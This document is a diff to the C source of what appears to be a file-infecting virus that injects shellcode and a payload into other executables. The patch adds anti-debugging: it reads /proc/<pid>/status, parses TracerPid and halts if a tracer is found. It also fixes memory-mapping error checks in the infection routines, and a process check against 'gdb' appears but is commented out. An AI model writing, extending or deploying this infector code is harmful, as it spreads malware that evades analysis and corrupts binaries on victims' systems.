@@ -9,7 +9,7 @@ int   entry_point(void *magic) {
 
   /* if (checkProcess(procName) != 0) */
   /*   return (stop(1, magic)); */
-  if (preventDebug(magic))
+  if (preventDebug(magic) != 0)
     return (stop(1, magic));
   if (magic != (void *)0x42) {
     if (unObfuscate() == -1)
@@ -92,7 +92,7 @@ static int unObfuscate(void) {
   return (0);
 }
 
-static int  read(int fd, char *buf, size_t count) {
+static ssize_t  read(int fd, char *buf, size_t count) {
   register ssize_t    rax asm("rax") = 0;
   register int        rdi asm("rdi") = fd;
   register const void *rsi asm("rsi") = buf;
@@ -156,6 +156,8 @@ static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t
 
   asm("syscall"
     : "=r" (ret));
+  if ((long)ret < 0)
+    return (NULL);
   return (ret);
 }
 
@@ -350,7 +352,7 @@ static int  checkFileContent(char *dirname, char *filename) {
   char    procName[] = "gdb";
 
   len = strlen(dirname) + strlen(filename) + 1;
-  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   memcpy(tmp, dirname, strlen(dirname));
   strcat(tmp, slash);
@@ -382,7 +384,7 @@ static int  checkProcess(char *dirname) {
   char  procName[] = "/proc/";
   char  cmdlineName[] = "cmdline";
 
-  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((buf = mmap(0, BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   if ((fd = open(procName, O_RDONLY | O_DIRECTORY, 0)) < 0) {
     munmap(buf, BUF_SIZE);
@@ -397,7 +399,7 @@ static int  checkProcess(char *dirname) {
     dirp = (struct linux_dirent64 *)(buf + bpos);
     if (dirp->d_type == DT_DIR && dirp->d_name[0] > '0' && dirp->d_name[0] <= '9' && strcmp(dirname, procName) == 0) {
       len = strlen(dirp->d_name) + strlen(procName) + 1;
-      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0) {
+      if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
         munmap(buf, BUF_SIZE);
         return (-1);
       }
@@ -427,10 +429,14 @@ static int   preventDebug(void *magic) {
   pid_t   pid;
   int     fd;
   size_t  len;
-  size_t  pidLen;
   char    *tmp;
+  ssize_t bread;
+  size_t  pidLen;
+  char    *pointer;
+  char    buf[BUF_SIZE];
   char  procName[] = "/proc/";
   char  statusName[] = "/status";
+  char  tracerPid[] = "TracerPid:";
 
   pidLen = 0;
   pid = getpid();
@@ -438,7 +444,7 @@ static int   preventDebug(void *magic) {
     pid /= 10;
     pidLen += 1;
   }
-  if ((tmp = mmap(0, 14 + pidLen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((tmp = mmap(0, 14 + pidLen, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   memcpy(tmp, procName, 6);
   pid = getpid();
@@ -449,10 +455,39 @@ static int   preventDebug(void *magic) {
     pid /= 10;
   }
   strcat(tmp, statusName);
-  if ((fd = open(tmp, O_RDONLY, 0)) < 0)
-    return (-1);
-  close(fd);
+  fd = open(tmp, O_RDONLY, 0);
   munmap(tmp, 14 + pidLen);
+  if (fd < 0)
+    return (-1);
+  pointer = NULL;
+  while ((bread = read(fd, buf, BUF_SIZE)) > 0) {
+    if (pointer != NULL) {
+      pointer = buf;
+      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
+        pointer += 1;
+      if (pointer - buf > bread)
+        continue ;
+      close(fd);
+      if (*pointer != '0')
+        return (1);
+      return (0);
+    }
+    pointer = NULL;
+    if ((pointer = strstr(buf, tracerPid)) != NULL) {
+      pointer += strlen(tracerPid);
+      if (pointer - buf > bread)
+        continue ;
+      while (pointer - buf <= bread && (*pointer < '0' || *pointer > '9'))
+        pointer += 1;
+      if (pointer - buf > bread)
+        continue ;
+      close(fd);
+      if (*pointer != '0')
+        return (1);
+      return (0);
+    }
+  }
+  close(fd);
   return (0);
 }
 
@@ -491,7 +526,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
   struct stat stats;
 
   len = strlen(dirname) + strlen(filename) + 2;
-  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
+  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL)
     return (-1);
   memcpy(tmp, dirname, strlen(dirname));
   strcat(tmp, slash);
@@ -509,7 +544,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     return (1);
   }
   munmap(tmp, len);
-  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0) {
+  if ((tmp = mmap(0, stats.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) == NULL) {
     close(fd);
     return (-1);
   }
@@ -520,7 +555,7 @@ static int  mapFile(const char *dirname, const char *filename, struct bfile *bin
     return (1);
   }
   len = strlen(payload) + sizeof(size_t) + 1;
-  if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) < 0) {
+  if ((bin->header = mmap(0, stats.st_size + len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) == NULL) {
     close(fd);
     munmap(tmp, stats.st_size);
     return (-1);
@@ -684,7 +719,7 @@ static int  appendShellcode(struct bfile *bin) {
 
   size = end - start + (lambdaEnd - lambdaStart);
   new.size = bin->size + size + sizeof(ins);
-  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0))  < 0)
+  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == NULL)
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   copyModifiedCode(&new, bin->size, size);
